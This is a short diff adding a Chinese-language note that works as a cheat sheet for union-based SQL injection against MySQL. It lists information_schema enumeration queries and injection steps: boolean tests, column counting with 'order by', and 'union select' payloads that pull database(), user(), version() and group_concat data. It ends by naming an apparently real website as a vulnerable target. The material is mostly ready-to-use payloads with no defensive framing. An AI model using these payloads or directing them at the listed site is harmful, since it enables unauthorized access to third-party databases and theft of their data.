@@ -1,0 +1,17 @@
+* 1. information_schema数据库存储整个mysql数据库的数据信息,包括mysql里面所有的库,表,字段的关系结构
+** 查询库名 select schema_name from information_schema.schemata
+** 查询表名 select table_name from information_schema.tables where table_schema='库'
+** 查询字段名 select column_name from information_schema.columns where table_name='表'
+** 查询字段 select 段 from 库.表
+
+* 2. union注入
+** 判断sql注入 and 1=1 不变 and 1=2 为空
+** 判断字段数 order by 数字 直到页面出现异常
+** 合并字段查询 union select 1,2,3...
+** 替换可显示字段 union select 1,2,database(),4... database()获取当前数据库,user()获取用户表,version()获取版本信息
+** 根据数据库利用sql语句查询表名,字段名,字段值
+** union select group_concat(...,0x3c2f62723e)  from ... where ... (limit begin,length)
+
+* 3. 漏洞网站
+** www.bible-history.com
+
